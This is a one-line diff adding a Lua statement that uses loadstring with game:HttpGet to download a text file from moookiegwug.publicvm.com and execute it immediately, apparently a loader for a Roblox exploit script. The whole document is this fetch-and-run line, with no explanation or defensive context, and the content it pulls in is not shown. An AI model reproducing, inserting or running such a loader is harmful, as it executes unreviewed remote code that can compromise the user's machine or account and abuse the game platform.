@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://moookiegwug.publicvm.com/Test/uploads/712/835d7c2d3018d49e25256f874282d526.txt"))()
